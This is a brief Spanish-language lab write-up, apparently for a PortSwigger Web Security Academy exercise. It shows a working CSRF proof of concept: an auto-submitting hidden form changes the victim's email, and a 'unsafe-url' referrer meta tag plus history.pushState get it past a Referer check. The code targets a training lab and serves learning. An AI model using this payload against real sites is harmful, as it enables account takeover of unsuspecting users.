
## Objetivo:

![[Pasted image 20240520222942.png]]

## Solucion:

Usar `<meta name="referrer" content="unsafe-url">` para que me NO ME QUITE todo lo que siga despues del sitio web, por ejemplo si el referrer es https://www.google.com/easy/money entonces por seguridad el navegador solo enviara https://www.google.com/ entonces al suar esa `<meta>` con esa configuracion evitamos que el navegador lo quite entonces quedaria como https://www.google.com/easy/money

![[Pasted image 20240520223004.png]]

```
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

<meta name="referrer" content="unsafe-url" >

</head>

  

<body>

<form action="https://0abf0072039db20983fd93f6001a001f.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="pwned@gmail.com" />

</form>

<script>

history.pushState('', '', '0abf0072039db20983fd93f6001a001f.web-security-academy.net')

document.forms[0].submit()

</script>

</body>

</html>
```
